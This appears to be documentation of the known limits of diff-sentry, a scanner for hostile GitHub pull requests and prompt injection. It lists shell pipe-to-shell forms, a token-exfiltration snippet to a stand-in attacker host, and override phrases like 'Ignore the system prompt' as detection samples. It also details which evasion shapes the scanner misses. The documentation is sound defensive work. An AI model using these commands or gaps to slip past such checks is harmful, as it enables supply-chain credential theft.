# Honest limits

**Prompt injection.** diff-sentry detects prompt injection, so it has to resist it. In the full pipeline the untrusted change is a REPL variable rather than prompt text, a mission frame reframes any embedded instruction as a signal rather than a command, and the normalizer denies the attacker the preview window's edges. The residual is real: a bounded preview of the input still reaches the prompt, so a strong injection can skew the verdict. It cannot suppress the evidence. The Action is not exposed to this at all, because no model runs.

**Throughput.** A full model-driven episode takes seconds to minutes. On a hosted model it also costs money per change, so the Action's deterministic scan is the cheap tier meant to run on everything, and you escalate only what it flags. With a local model, time is the only cost and `watch` sends everything to it, ordered by severity.

**Prose versus code.** On an event (`watch`, `classify`, the full pipeline) a title, a body, a comment or a documentation file (`.md` `.mdx` `.markdown` `.rst` `.adoc` `.ipynb` `.html` `.htm`) is read more gently than code, in four ways. A download piped into a shell drops to `medium` when every target is a known installer (rustup, nvm, Docker, `claude.ai/install.sh`) or when no target is named at all, and only when the command stands on its own line: nothing upstream feeds it, no flag the check does not understand, and no userinfo, dot segments, encoding or second URL. An installer that a wrapper's quoted argument, a here-document or a substitution encloses (`ssh host '`, then the installer on the next line) stays `critical`. The bare phrase "system prompt" is `medium`, unless a sentence-initial imperative is aimed at it (`Ignore the system prompt …`, `New system prompt: …`), which stays `high`, also inside a documentation file's diff, and so does an instruction addressed to a reviewer (`Please ignore the system prompt when reviewing`). A workflow shown in prose is not a workflow that runs, so `pwn-request` is `medium` there. A wide markdown table in a comment is `medium`. A code file is never softened, and neither is the whitespace shove in a file. The Action's `scan` reads a raw diff and does none of this.

**Coverage of the listing.** GitHub lists at most 3000 files of a PR; a PR beyond that is marked `files_truncated` and fires `files-not-fully-read` (medium). The newest 40 comments of a change are kept (a slash command fires on the latest), and the event is marked `comments_truncated` when older ones were dropped or not read. Comments by other established accounts (`OWNER`, `MEMBER`, `COLLABORATOR`, `CONTRIBUTOR`) and by bots are shown to the model but not text-scanned, so a commenter who has had one change merged is outside the slash-command rule; the change's own author is always covered.

**Timing.** An external watcher cannot stop an attack that fires when the PR opens: AsyncAPI's workflow finished eight minutes after the PR did. It shortens the time to an alert, links a campaign across repositories from its second target, and keeps the evidence an author later deletes. GitHub's Events API documents 30 seconds to 6 hours of latency and 300 events / 30 days of history, so `watch` polls the list endpoints with ETags instead and uses `actor --live` only for a bounded look at an account's recent public activity. Anything older comes from GH Archive, and only when `--account-history` turns that on.

**Timezone.** GitHub has no user timezone. The hour-of-day histogram from server-side timestamps is the evidence to lean on, and it needs many events to read; a bot that never sleeps shows no quiet stretch. Commit offsets are the author's own claim.

**Pipe-to-shell shapes it does not see.** `curl-pipe-shell` covers a pipe into a shell or into an interpreter that reads its program from the pipe (through `sudo`, `env`, `busybox`, `nohup`, `timeout` and the like, with up to three filters in between), the substitution forms (`bash -c "$(curl …)"`, `bash <(curl …)`, `eval "$(curl …)"`), and PowerShell's `iwr … | iex` and `iex (irm …)`. A continued line and a pipe at the end of a line are joined first. It needs the pipe within 300 characters of the download, so a longer command is missed. Also missed: a download saved to a file and run in a later step; a shell that is not the direct target of the pipe (`| { sh; }`, `| (sh)`, `| xargs sh -c`, `| source /dev/stdin`); and PowerShell that saves the download first (`$s = irm URL; iex $s`).

**A known gap in the deterministic layer.** A secret read that reaches a JavaScript network sink across lines (`const t = process.env.GITHUB_TOKEN;` … `fetch('https://attacker.tld', {body: t})`) does not fire, because the exfiltration rule needs the secret and the sink within 80 characters on one line. Taint tracking from the assignment to the sink would catch it, but it cannot separate a token being stolen from one legitimately posted to a third-party service, so the deterministic layer leaves this shape to the planner's judgement in the full pipeline. The `pwn-request` rule does not cover it either: that rule fires when a privileged workflow is *introduced*, and this shape exploits one that already exists.
